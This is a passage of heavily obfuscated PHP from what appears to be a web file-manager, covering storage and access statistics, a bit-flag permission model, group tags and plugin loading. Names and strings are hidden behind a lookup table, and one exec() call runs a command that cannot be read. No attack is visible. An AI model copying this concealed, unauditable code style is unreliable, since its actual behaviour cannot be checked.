[1954] => array($Π‹µ¬ [1100], $΅Α‚Α)); $γ±ρΙή = (int) Model($Π‹µ¬ [602])->where($°λ‚µΕΈ)->count($Π‹µ¬ [1793]); if (!$γ±ρΙή) { $γ±ρΙή = 1; } $°λ‚µΕΈ = array($Π‹µ¬ [1954] => array($Π‹µ¬ [1100], $βφρκΌ)); $»³›Ϋ¨ = Model($Π‹µ¬ [602])->where($°λ‚µΕΈ)->count($Π‹µ¬ [1793]); return array($Π‹µ¬ [833] => (int) $«Ό©μ’ν, $Π‹µ¬ [1955] => (int) ($«Ό©μ’ν - $Ύ–•σΒς), $Π‹µ¬ [1956] => (int) $Ύ–•σΒς, $Π‹µ¬ [1957] => (int) $»³›Ϋ¨, $Π‹µ¬ [1958] => $γ±ρΙή); } private function optionFile() { $ρΉΊ®ϋ =& $_SERVER[γγάψ½]; $€Λ­‹ = $this->sourceSize(); $Ε΅Θ‚” = $€Λ­‹[$ρΉΊ®ϋ[79]]; $£λΥΨΎΙ = $€Λ­‹[$ρΉΊ®ϋ[1927]]; $†”½ΉΑ = Model($ρΉΊ®ϋ[905])->where(array($ρΉΊ®ϋ[488] => 0))->count($ρΉΊ®ϋ[194]); $ΏΓ­πΫκ = array($ρΉΊ®ϋ[488] => 0, $ρΉΊ®ϋ[234] => array($ρΉΊ®ϋ[1100], strtotime(date($ρΉΊ®ϋ[1934])))); $³¥’θ = Model($ρΉΊ®ϋ[905])->where($ΏΓ­πΫκ)->sum($ρΉΊ®ϋ[79]); $‡°’ς‰ = Model($ρΉΊ®ϋ[905])->where($ΏΓ­πΫκ)->count($ρΉΊ®ϋ[194]); return array($ρΉΊ®ϋ[838] => $Ε΅Θ‚”, $ρΉΊ®ϋ[1927] => $£λΥΨΎΙ, $ρΉΊ®ϋ[1959] => $Ε΅Θ‚” - $£λΥΨΎΙ, $ρΉΊ®ϋ[1960] => (int) $³¥’θ, $ρΉΊ®ϋ[840] => (int) $†”½ΉΑ, $ρΉΊ®ϋ[1961] => (int) $‡°’ς‰); } private function optionAccess() { $»―®•Ρ =& $_SERVER[γγάψ½]; return array($»―®•Ρ[833] => $this->typeLogCnt(), $»―®•Ρ[110] => $this->typeLogCnt($»―®•Ρ[110]), $»―®•Ρ[528] => $this->typeLogCnt($»―®•Ρ[528]), $»―®•Ρ[1962] => $this->typeLogCnt($»―®•Ρ[1962]), $»―®•Ρ[1963] => $this->typeLogCnt($»―®•Ρ[1963]), $»―®•Ρ[670] => $this->typeLogCnt($»―®•Ρ[12], $»―®•Ρ[1938])); } private function typeLogCnt($αΩηΘΝ = '', $ƒί‚Έ = "\151\x64") { $ „·ΠηΛ =& $_SERVER[γγάψ½]; $ξΎ¶κ‰½ = array($ „·ΠηΛ[110] => array($ „·ΠηΛ[1964], $ „·ΠηΛ[1965]), $ „·ΠηΛ[528] => array($ „·ΠηΛ[1966], $ „·ΠηΛ[1967]), $ „·ΠηΛ[1962] => array($ „·ΠηΛ[1968], $ „·ΠηΛ[1969], $ „·ΠηΛ[1970]), $ „·ΠηΛ[1963] => array($ „·ΠηΛ[1971], $ „·ΠηΛ[1972]), $ „·ΠηΛ[1973] => array($ „·ΠηΛ[1974], $ „·ΠηΛ[1975], $ „·ΠηΛ[1976])); $§Χ³¤Ά = strtotime(date($ „·ΠηΛ[1934])); $ςϊΊΕ = array($ „·ΠηΛ[234] => array($ „·ΠηΛ[1100], $§Χ³¤Ά)); if ($αΩηΘΝ) { $ςϊΊΕ[$ „·ΠηΛ[33]] = array($ „·ΠηΛ[7], $ξΎ¶κ‰½[$αΩηΘΝ]); } $ΗμΚω = Model($ „·ΠηΛ[1937])->where($ςϊΊΕ)->count($ƒί‚Έ); return (int) $ΗμΚω; } private function optionServer() { $¥Ο°¤€ =& $_SERVER[γγάψ½]; $ξ”ξϊ = $this->diskDriver(); $ύο›¬σΕ = KodIO::defaultDriver(); $ώ―ί“κς = array($¥Ο°¤€[898] => $ύο›¬σΕ[$¥Ο°¤€[478]]); $Υ‡΄‰Ρ‚ = Model($¥Ο°¤€[549])->where($ώ―ί“κς)->sum($¥Ο°¤€[79]); $‡‹ί¥σ® = explode($¥Ο°¤€[53], $_SERVER[$¥Ο°¤€[147]]); $όΙΒ£·ψ = $‡‹ί¥σ®[0]; $“Έ¶Αφ§ = $GLOBALS[$¥Ο°¤€[6]][$¥Ο°¤€[21]]; $±«ΪΞΫ“ = $“Έ¶Αφ§[$¥Ο°¤€[1062]]; if ($±«ΪΞΫ“ == $¥Ο°¤€[1050]) { $ή¨Μ²ψ = explode($¥Ο°¤€[1379], $“Έ¶Αφ§[$¥Ο°¤€[1061]]); $±«ΪΞΫ“ = $ή¨Μ²ψ[0]; } if ($±«ΪΞΫ“ == $¥Ο°¤€[998] || $±«ΪΞΫ“ == $¥Ο°¤€[883]) { $ΝαΎώΒΥ = Model()->db()->query($¥Ο°¤€[1977]); $®†±Π„έ = $ΝαΎώΒΥ[0] && isset($ΝαΎώΒΥ[0][$¥Ο°¤€[1678]]) ? $ΝαΎώΒΥ[0][$¥Ο°¤€[1678]] : 0; $±«ΪΞΫ“ = $¥Ο°¤€[1978] . ($®†±Π„έ ? $¥Ο°¤€[8] . $®†±Π„έ : $¥Ο°¤€[12]); } $ψ±…‰‘ = $GLOBALS[$¥Ο°¤€[6]][$¥Ο°¤€[427]][$¥Ο°¤€[907]]; return array($¥Ο°¤€[1979] => $ξ”ξϊ ? $ξ”ξϊ[$¥Ο°¤€[1980]] : 0, $¥Ο°¤€[1981] => $ξ”ξϊ ? $ξ”ξϊ[$¥Ο°¤€[1982]] : 0, $¥Ο°¤€[1983] => (int) $ύο›¬σΕ[$¥Ο°¤€[1980]] * 1024 * 1024 * 1024, $¥Ο°¤€[1984] => (int) $Υ‡΄‰Ρ‚, $¥Ο°¤€[1985] => ucfirst($όΙΒ£·ψ), $¥Ο°¤€[1986] => $¥Ο°¤€[1987] . PHP_VERSION, $¥Ο°¤€[1988] => phpBuild64() ? 64 : 32, $¥Ο°¤€[832] => str_replace($¥Ο°¤€[1218], $¥Ο°¤€[1078], $±«ΪΞΫ“), $¥Ο°¤€[427] => ucfirst($ψ±…‰‘), $¥Ο°¤€[32] => $_SERVER[$¥Ο°¤€[1989]]); } private function diskDriver() { $γΥΆΊΕ =& $_SERVER[γγάψ½]; $ϊ±αή‰ν = $γΥΆΊΕ[8]; $”ζσφ = $GLOBALS[$γΥΆΊΕ[6]][$γΥΆΊΕ[1403]] == $γΥΆΊΕ[1404]; if ($”ζσφ) { $ϊ±αή‰ν = $γΥΆΊΕ[1990]; if (function_exists($γΥΆΊΕ[1991])) { exec($γΥΆΊΕ[1992], $άύ±); $ϊ±αή‰ν = $άύ±[1] . $γΥΆΊΕ[8]; } } if (!file_exists($ϊ±αή‰ν)) { return; } if (!function_exists($γΥΆΊΕ[1993])) { return; } $ϊ•ƒ† = @disk_total_space($ϊ±αή‰ν); $Ζΐ­ίι = $ϊ•ƒ† - @disk_free_space($ϊ±αή‰ν); return array($γΥΆΊΕ[1980] => $ϊ•ƒ†, $γΥΆΊΕ[1982] => $Ζΐ­ίι); } public function fileChart($ΌΦ£τ‡) { $Ϋξ­ύο™ =& $_SERVER[γγάψ½]; if (isset($ΌΦ£τ‡[$Ϋξ­ύο™[1793]])) { return Model($Ϋξ­ύο™[905])->userFileTypeProfile($ΌΦ£τ‡[$Ϋξ­ύο™[1793]]); } if (isset($ΌΦ£τ‡[$Ϋξ­ύο™[1401]])) { return Model($Ϋξ­ύο™[905])->groupFileTypeProfile($ΌΦ£τ‡[$Ϋξ­ύο™[1401]]); } $½—ƒ»Ό² = $this->sourceSize(); $·…·ΟƒΨ = array($Ϋξ­ύο™[193] => 0, $Ϋξ­ύο™[191] => 1); $Σ”«° = Model($Ϋξ­ύο™[905])->where($·…·ΟƒΨ)->sum($Ϋξ­ύο™[79]); $·…·ΟƒΨ[$Ϋξ­ύο™[191]] = 2; $°—’Ίέή = Model($Ϋξ­ύο™[905])->where($·…·ΟƒΨ)->sum($Ϋξ­ύο™[79]); return array($Ϋξ­ύο™[838] => $½—ƒ»Ό²[$Ϋξ­ύο™[79]], $Ϋξ­ύο™[1927] => $½—ƒ»Ό²[$Ϋξ­ύο™[1927]], $Ϋξ­ύο™[1928] => (int) $Σ”«°, $Ϋξ­ύο™[1929] => (int) $°—’Ίέή); } private function sourceSize() { $”ΦΆ¤­ =& $_SERVER[γγάψ½]; $ΒΜ™μΟ— = Model($”ΦΆ¤­[905])->where(array($”ΦΆ¤­[488] => 0))->sum($”ΦΆ¤­[79]); $£’®ξ = Model($”ΦΆ¤­[549])->sum($”ΦΆ¤­[79]); if ($£’®ξ > $ΒΜ™μΟ—) { $£’®ξ = $ΒΜ™μΟ—; } return array($”ΦΆ¤­[79] => (int) $ΒΜ™μΟ—, $”ΦΆ¤­[1927] => (int) $£’®ξ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ξΰ¤ =& $_SERVER[γγάψ½]; $”ΝΊΠϋ = array(array($ξΰ¤[497] => LNG($ξΰ¤[1994]), $ξΰ¤[1995] => $ξΰ¤[1996], $ξΰ¤[1997] => 1, $ξΰ¤[1998] => 1, $ξΰ¤[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ξΰ¤[497] => LNG($ξΰ¤[2000]), $ξΰ¤[1995] => $ξΰ¤[2001], $ξΰ¤[1997] => 2, $ξΰ¤[1998] => 1, $ξΰ¤[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ξΰ¤[497] => LNG($ξΰ¤[2002]), $ξΰ¤[1995] => $ξΰ¤[2003], $ξΰ¤[1997] => 3, $ξΰ¤[1998] => 1, $ξΰ¤[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ξΰ¤[497] => LNG($ξΰ¤[2004]), $ξΰ¤[1995] => $ξΰ¤[2005], $ξΰ¤[1997] => 4, $ξΰ¤[1998] => 1, $ξΰ¤[1999] => self::AUTH_SHOW | self::AUTH_VIEW), array($ξΰ¤[497] => LNG($ξΰ¤[2006]), $ξΰ¤[1995] => $ξΰ¤[2007], $ξΰ¤[1997] => 5, $ξΰ¤[1998] => 1, $ξΰ¤[1999] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ξΰ¤[497] => LNG($ξΰ¤[2008]), $ξΰ¤[1995] => $ξΰ¤[2009], $ξΰ¤[1997] => 6, $ξΰ¤[1998] => 1, $ξΰ¤[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ξΰ¤[497] => LNG($ξΰ¤[2010]), $ξΰ¤[1995] => $ξΰ¤[2011], $ξΰ¤[1997] => 7, $ξΰ¤[1998] => 1, $ξΰ¤[1999] => 0)); return $”ΝΊΠϋ; } public static function authCheck($δΧύµ, $ΩΖƒτ) { $ϋ¨ρΒΌ =& $_SERVER[γγάψ½]; $δΧύµ = intval($δΧύµ); if (KodUser::isRoot() && $GLOBALS[$ϋ¨ρΒΌ[6]][$ϋ¨ρΒΌ[2012]]) { return !0; } if ($δΧύµ <= 0) { return !1; } if (($δΧύµ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($δΧύµ & $ΩΖƒτ); } public static function authCheckShow($φΨΫΰφƒ) { return self::authCheck($φΨΫΰφƒ, self::AUTH_SHOW); } public static function authCheckView($Χ²¦Θ§) { return self::authCheck($Χ²¦Θ§, self::AUTH_VIEW); } public static function authCheckDownload($ƒΞ‚µ„ψ) { return self::authCheck($ƒΞ‚µ„ψ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ΛωΝ…§) { return self::authCheck($ΛωΝ…§, self::AUTH_UPLOAD); } public static function authCheckEdit($ΰ„‡§ο¬) { return self::authCheck($ΰ„‡§ο¬, self::AUTH_EDIT); } public static function authCheckRemove($‚Ώ€³΄ϊ) { return self::authCheck($‚Ώ€³΄ϊ, self::AUTH_REMOVE); } public static function authCheckShare($»Η΄¤ϊ) { return self::authCheck($»Η΄¤ϊ, self::AUTH_SHARE); } public static function authCheckComment($Ψ†ΝΩ·¨) { return self::authCheck($Ψ†ΝΩ·¨, self::AUTH_COMMENT); } public static function authCheckEvent($¬”¶’‰ς) { return self::authCheck($¬”¶’‰ς, self::AUTH_EVENT); } public static function authCheckRoot($»Μµ) { return self::authCheck($»Μµ, self::AUTH_ROOT); } public static function authCheckAction($ιΒΨ¦β‘, $ωΝφ«…) { $ού³ΖΆ‰ =& $_SERVER[γγάψ½]; $όϋο±Ϋ± = array($ού³ΖΆ‰[2013] => self::AUTH_VIEW, $ού³ΖΆ‰[1290] => self::AUTH_DOWNLOAD, $ού³ΖΆ‰[110] => self::AUTH_UPLOAD, $ού³ΖΆ‰[1963] => self::AUTH_EDIT, $ού³ΖΆ‰[1962] => self::AUTH_REMOVE, $ού³ΖΆ‰[1973] => self::AUTH_SHARE, $ού³ΖΆ‰[432] => self::AUTH_COMMENT, $ού³ΖΆ‰[1780] => self::AUTH_EVENT, $ού³ΖΆ‰[2014] => self::AUTH_ROOT); if (!isset($όϋο±Ϋ±[$ωΝφ«…])) { return; } $Ο—φαΑ = $όϋο±Ϋ±[$ωΝφ«…]; $ιΒΨ¦β‘ = intval($ιΒΨ¦β‘); if ($ιΒΨ¦β‘ <= 0) { return !1; } if (($ιΒΨ¦β‘ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ιΒΨ¦β‘ & $Ο—φαΑ); } public static function authDisable($½άµ΄, $ύϋΏψΎΜ) { if (intval($½άµ΄) <= 0) { return 0; } return intval($½άµ΄) & ~$ύϋΏψΎΜ; } public $optionType = "\x53\171\163\x74\x65\155\56\163\157\x75\x72\143\x65\101\x75\164\150\114\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\141\165\x74\x68", "\154\x61\142\x65\x6c", "\x64\151\163\x70\154\141\171", "\163\171\163\x74\x65\x6d", "\x73\x6f\x72\164"); public function initData() { $¶ΆΏ€ΖΨ = $this->authDefault(); foreach ($¶ΆΏ€ΖΨ as $³‚Ω®‘) { $this->add($³‚Ω®‘); } } public function findAuth($–ϊΛ, $Ο δ‡Β) { $Σπή‘ψη =& $_SERVER[γγάψ½]; $ΦΑΪίΜ = parent::listData(); foreach ($ΦΑΪίΜ as $¨Ξσ) { $¤ηΟ¬Δ‡ = intval($¨Ξσ[$Σπή‘ψη[490]]); if ($¤ηΟ¬Δ‡ <= 0 || $¨Ξσ[$Σπή‘ψη[2015]] == 0) { continue; } if (($¤ηΟ¬Δ‡ & $–ϊΛ) != $–ϊΛ) { continue; } if (($¤ηΟ¬Δ‡ & $Ο δ‡Β) != 0) { continue; } return $¨Ξσ[$Σπή‘ψη[478]]; } return !1; } public function findAuthMax($τ°Ϊ€ΞΤ, $ΩΑϊσ·) { $γ΄®δρ =& $_SERVER[γγάψ½]; $ΞύΊ»—ό = !1; $£°¶ƒΚ = parent::listData(); foreach ($£°¶ƒΚ as $Ο¨”“΄ω) { $ρώµ»—λ = intval($Ο¨”“΄ω[$γ΄®δρ[490]]); if ($ρώµ»—λ <= 0 || $Ο¨”“΄ω[$γ΄®δρ[2015]] == 0) { continue; } if (($ρώµ»—λ & $τ°Ϊ€ΞΤ) != $τ°Ϊ€ΞΤ) { continue; } if (($ρώµ»—λ & $ΩΑϊσ·) != 0) { continue; } if (!$ΞύΊ»—ό) { $ΞύΊ»—ό = $Ο¨”“΄ω; continue; } if (intval($ΞύΊ»—ό[$γ΄®δρ[490]]) < $ρώµ»—λ) { $ΞύΊ»—ό = $Ο¨”“΄ω; } } return $ΞύΊ»—ό ? $ΞύΊ»—ό[$γ΄®δρ[478]] : !1; } public function findAuthReadOnly() { $ι–›Ίκπ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $»Ε΄¬Ε = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ι–›Ίκπ, $»Ε΄¬Ε); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $΄¤ξ…ή² =& $_SERVER[γγάψ½]; $Ε΄«τ = parent::listData(); $ΛΞ·Νµ = !1; foreach ($Ε΄«τ as $έκ°Ζώ·) { if ($έκ°Ζώ·[$΄¤ξ…ή²[490]] <= 0 || $έκ°Ζώ·[$΄¤ξ…ή²[2015]] == $΄¤ξ…ή²[231]) { continue; } if (!$ΛΞ·Νµ) { $ΛΞ·Νµ = $έκ°Ζώ·; continue; } if ($ΛΞ·Νµ[$΄¤ξ…ή²[490]] > $έκ°Ζώ·[$΄¤ξ…ή²[490]]) { $ΛΞ·Νµ = $έκ°Ζώ·; } } return $ΛΞ·Νµ ? $ΛΞ·Νµ[$΄¤ξ…ή²[478]] : $΄¤ξ…ή²[12]; } public function listData($Ρ°ΨΜωΆ = false, $έΠ€αΩ = "\163\157\x72\x74", $μƒƒΥ€ = false) { return parent::listData($Ρ°ΨΜωΆ, $έΠ€αΩ, $μƒƒΥ€); } public function update($Κ£–, $ΜƒοΆ―…) { $¬ΐ„νΰό =& $_SERVER[γγάψ½]; $–¨ΪυΎ— = parent::listData($Κ£–); $πψΙ®―‰ = $this->findByName($ΜƒοΆ―…[$¬ΐ„νΰό[32]]); if (!$–¨ΪυΎ— || $πψΙ®―‰ && $πψΙ®―‰[$¬ΐ„νΰό[478]] != $–¨ΪυΎ—[$¬ΐ„νΰό[478]]) { return !1; } $this->filterAuth($ΜƒοΆ―…[$¬ΐ„νΰό[490]]); return parent::update($Κ£–, $ΜƒοΆ―…); } public function remove($‹ΎΜΗ―) { $΄“α‰‘Μ = parent::listData($‹ΎΜΗ―); if (!$΄“α‰‘Μ || $΄“α‰‘Μ[$_SERVER[γγάψ½][192]]) { return !1; } return parent::remove($‹ΎΜΗ―); } public function add($ΤΧΒΖΰώ = array()) { $α•ΔϋΊ =& $_SERVER[γγάψ½]; if ($this->findByName($ΤΧΒΖΰώ[$α•ΔϋΊ[32]])) { return !1; } $‹οώ“«Σ = array($α•ΔϋΊ[32] => $α•ΔϋΊ[12], $α•ΔϋΊ[490] => 1, $α•ΔϋΊ[2016] => $α•ΔϋΊ[2003], $α•ΔϋΊ[2015] => 1, $α•ΔϋΊ[192] => 0, $α•ΔϋΊ[2017] => 0); $ΤΧΒΖΰώ = array_merge($‹οώ“«Σ, $ΤΧΒΖΰώ); $ΤΧΒΖΰώ[$α•ΔϋΊ[2017]] = $this->getSort(); $this->filterAuth($ΤΧΒΖΰώ[$α•ΔϋΊ[490]]); return parent::insert($ΤΧΒΖΰώ); } private function getSort() { $£ƒΙΫ¥Ζ =& $_SERVER[γγάψ½]; $ΆτΓυ· = parent::listData(); $›γυ“² = array_to_keyvalue($ΆτΓυ·, $£ƒΙΫ¥Ζ[12], $£ƒΙΫ¥Ζ[2017]); return empty($›γυ“²) ? 0 : max($›γυ“²) + 1; } private function filterAuth(&$π’£ΐ) { if (!$π’£ΐ) { return; } $ιΕβ‹ξέ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $³΄τκ®® = array(); foreach ($ιΕβ‹ξέ as $ν£ΰέΩ) { if ($π’£ΐ & $ν£ΰέΩ) { $³΄τκ®®[] = $ν£ΰέΩ; } } if (in_array(self::AUTH_ROOT, $³΄τκ®®)) { $π’£ΐ = array_sum($ιΕβ‹ξέ); return; } $Υ­‘‚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($³΄τκ®® as $ν£ΰέΩ) { if (isset($Υ­‘‚[$ν£ΰέΩ])) { $³΄τκ®® = array_merge($³΄τκ®®, $Υ­‘‚[$ν£ΰέΩ]); } } $³΄τκ®®[] = self::AUTH_SHOW; $π’£ΐ = array_sum(array_unique($³΄τκ®®)); } public function sort($»΅ξ­©, $›ήη¨ά—) { return parent::update($»΅ξ­©, $›ήη¨ά—); } } goto dβΙ±‘‡δ; aΎήέ†Οα: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($μ Μςζ) { $Υ‰ =& $_SERVER[γγάψ½]; return array($Υ‰[2107] => array($μ Μςζ[0], $Υ‰[2108]), $Υ‰[2109] => array($μ Μςζ[0], $Υ‰[2110])); } protected function get($πΤ±¨ΰ) { $ο§Ι“ύϋ =& $_SERVER[γγάψ½]; $Κ³όΊ„ = Model($ο§Ι“ύϋ[590])->metaGet($πΤ±¨ΰ, $ο§Ι“ύϋ[2111]); $οή ί§ = json_decode($Κ³όΊ„, !0); return $οή ί§ ? $οή ί§ : array($ο§Ι“ύϋ[2112] => $ο§Ι“ύϋ[91], $ο§Ι“ύϋ[448] => array()); } protected function set($³Έ¶΅»υ, $ΏΚϊ–«) { $Ά­Β¨Γπ =& $_SERVER[γγάψ½]; $ΏΚϊ–« = $ΏΚϊ–« ? $ΏΚϊ–« : array($Ά­Β¨Γπ[2112] => $Ά­Β¨Γπ[91], $Ά­Β¨Γπ[448] => array()); return Model($Ά­Β¨Γπ[590])->metaSet($³Έ¶΅»υ, $Ά­Β¨Γπ[2111], json_encode($ΏΚϊ–«)); } protected function getByTagID($σ‡Ρΐ«, $ί¶Σϋ²) { $Τ—Ο§ίυ =& $_SERVER[γγάψ½]; if (!$σ‡Ρΐ« || !$ί¶Σϋ²) { return !1; } if (!Model($Τ—Ο§ίυ[590])->getInfoSimple($σ‡Ρΐ«)) { return !1; } $ι«Ϋ®Μ = $this->get($σ‡Ρΐ«); if (!$ι«Ϋ®Μ || !isset($ι«Ϋ®Μ[$Τ—Ο§ίυ[448]])) { return !1; } $ΧΘβΜ = array_find_by_field($ι«Ϋ®Μ[$Τ—Ο§ίυ[448]], $Τ—Ο§ίυ[478], $ί¶Σϋ²); return is_array($ΧΘβΜ) ? $ΧΘβΜ : !1; } public function listSource($ΈΖΧΝΒ“, $Ι‚ε¶εƒ) { $†•©’ =& $_SERVER[γγάψ½]; if ($Ι‚ε¶εƒ && !is_array($Ι‚ε¶εƒ)) { $Ι‚ε¶εƒ = array($Ι‚ε¶εƒ); } $‚€Ϊ°κ¬ = $this->listData($ΈΖΧΝΒ“); $Ψ΅ΡκΒ = array(); foreach ($‚€Ϊ°κ¬ as $Κ΄«ζΚ¦) { $ΟΫ–ƒν = $Κ΄«ζΚ¦[$†•©’[87]]; if (!$ΟΫ–ƒν) { continue; } if (!isset($Ψ΅ΡκΒ[$ΟΫ–ƒν])) { $Ψ΅ΡκΒ[$ΟΫ–ƒν] = array(); } $Ψ΅ΡκΒ[$ΟΫ–ƒν][] = $Κ΄«ζΚ¦[$†•©’[503]]; } $ς¶ϊΠΫΜ = array(); foreach ($Ψ΅ΡκΒ as $ά›ΘΚΫ => $§Μ·¥) { $πύ‚ήΝγ = !0; if (!$Ι‚ε¶εƒ) { $ς¶ϊΠΫΜ[] = $ά›ΘΚΫ; continue; } foreach ($Ι‚ε¶εƒ as $ΛΓΗ‚βΘ) { if (!in_array($ΛΓΗ‚βΘ, $§Μ·¥)) { $πύ‚ήΝγ = !1; break; } } if ($πύ‚ήΝγ) { $ς¶ϊΠΫΜ[] = $ά›ΘΚΫ; } } if (!$ς¶ϊΠΫΜ) { return array(); } $µ¦­΅ = array($†•©’[494] => array($†•©’[495], $ς¶ϊΠΫΜ), $†•©’[574] => $ΈΖΧΝΒ“, $†•©’[191] => SourceModel::TYPE_GROUP); $¬²»¥π = Model($†•©’[1439])->listSource($µ¦­΅); if (!$¬²»¥π || count($ς¶ϊΠΫΜ) == $¬²»¥π[$†•©’[445]][$†•©’[446]]) { return $¬²»¥π; } $―Ά©θ³Ί = array(); $„ΦΒϊα = array_to_keyvalue($¬²»¥π[$†•©’[85]], $†•©’[12], $†•©’[194]); $™Ω¬βόΡ = array_to_keyvalue($¬²»¥π[$†•©’[86]], $†•©’[12], $†•©’[194]); $•ΓψΚ®Δ = array_merge($™Ω¬βόΡ, $„ΦΒϊα); foreach ($ς¶ϊΠΫΜ as $ΟΫ–ƒν) { if (!in_array($ΟΫ–ƒν, $•ΓψΚ®Δ)) { $―Ά©θ³Ί[] = $ΟΫ–ƒν; } } if ($―Ά©θ³Ί) { $this->removeBySource($ΈΖΧΝΒ“, $―Ά©θ³Ί); } return $¬²»¥π; } protected function listData($²γεςο) { $‡ξζ¥‹ =& $_SERVER[γγάψ½]; $Τέοέ·λ = array($‡ξζ¥‹[1784] => 0, $‡ξζ¥‹[562] => array($‡ξζ¥‹[2113], 0), $‡ξζ¥‹[499] => $‡ξζ¥‹[1397] . $²γεςο); $έ¤Κ¬χ = $‡ξζ¥‹[2114]; $®½½»Όκ = $this->field($έ¤Κ¬χ)->where($Τέοέ·λ)->order($‡ξζ¥‹[2115])->select(); return $®½½»Όκ ? $®½½»Όκ : array(); } protected function addToTag($Ξόƒ…έ, $›Ζω, $³η‰Έ) { $¤„Ίυΐ =& $_SERVER[γγάψ½]; if (!$this->getByTagID($Ξόƒ…έ, $³η‰Έ) || !$›Ζω) { return !1; } if (!Model($¤„Ίυΐ[905])->pathInfo($›Ζω)) { return !1; } $›ΚξΎ° = array($¤„Ίυΐ[1784] => 0, $¤„Ίυΐ[562] => $³η‰Έ, $¤„Ίυΐ[498] => $›Ζω, $¤„Ίυΐ[499] => $¤„Ίυΐ[2116] . $Ξόƒ…έ, $¤„Ίυΐ[497] => $¤„Ίυΐ[12], $¤„Ίυΐ[1997] => 0); if ($this->where($›ΚξΎ°)->find()) { return !1; } return $this->add($›ΚξΎ°); } protected function removeFromTag($Κ£‘ΧΗ, $Φήψ£, $Μ•αΞ²Ϋ) { $ΣΠΉΫΗ =& $_SERVER[γγάψ½]; if (!$this->getByTagID($Κ£‘ΧΗ, $Μ•αΞ²Ϋ) || !$Φήψ£) { return !1; } if (is_array($Φήψ£)) { $Φήψ£ = array($ΣΠΉΫΗ[7], $Φήψ£); } $Έ½•¶ηΖ = array($ΣΠΉΫΗ[1784] => 0, $ΣΠΉΫΗ[562] => $Μ•αΞ²Ϋ, $ΣΠΉΫΗ[499] => $ΣΠΉΫΗ[2116] . $Κ£‘ΧΗ, $ΣΠΉΫΗ[498] => $Φήψ£); return $this->where($Έ½•¶ηΖ)->delete(); } protected function removeByTag($“ΦΪ­ , $ωέήΟ―) { $€—ζ‹• =& $_SERVER[γγάψ½]; if (!$this->getByTagID($“ΦΪ­ , $ωέήΟ―)) { return !1; } $–ρλΎΉ = array($€—ζ‹•[1784] => 0, $€—ζ‹•[562] => $ωέήΟ―, $€—ζ‹•[499] => $€—ζ‹•[2116] . $“ΦΪ­ ); return $this->where($–ρλΎΉ)->delete(); } protected function removeBySource($Εζ·Σ¤•, $ξι§£·•) { $Ω°ψ»όρ =& $_SERVER[γγάψ½]; if (!$Εζ·Σ¤• || !$ξι§£·•) { return !1; } if (is_array($ξι§£·•)) { $ξι§£·• = array($Ω°ψ»όρ[7], $ξι§£·•); } $°Ϋί‰Ζ = array($Ω°ψ»όρ[1784] => 0, $Ω°ψ»όρ[498] => $ξι§£·•, $Ω°ψ»όρ[562] => array($Ω°ψ»όρ[1100], 0), $Ω°ψ»όρ[499] => $Ω°ψ»όρ[2116] . $Εζ·Σ¤•); return $this->where($°Ϋί‰Ζ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\160\x6c\x75\x67\x69\x6e\x4c\151\x73\164"; public $field = array("\156\x61\155\145", "\163\164\141\x74\165\x73", "\x72\x65\x67\151\x65\x73\x74", "\143\157\x6e\146\151\x67"); public function loadList($λΩς‘µΈ = false) { $πΞψ©“ = array_to_keyvalue($this->listData(), $_SERVER[γγάψ½][32]); if ($λΩς‘µΈ) { return $πΞψ©“[$λΩς‘µΈ]; } return $πΞψ©“; } public function init() { $¤–¬‘µ =& $_SERVER[γγάψ½]; Hook::trigger($¤–¬‘µ[2117]); $¶ΒΥΠ = $this->loadPluginList(); foreach ($¶ΒΥΠ as $ΉΪΤΆ => $§³Υ¥Ή) { $θ¦‰…€ = $this->appAllow($ΉΪΤΆ, $§³Υ¥Ή); if (!$θ¦‰…€) { continue; } foreach ($§³Υ¥Ή[$¤–¬‘µ[2118]] as $“ΖΫΊ¶ε => $ΜφτΩµ) { Hook::bind($“ΖΫΊ¶ε, 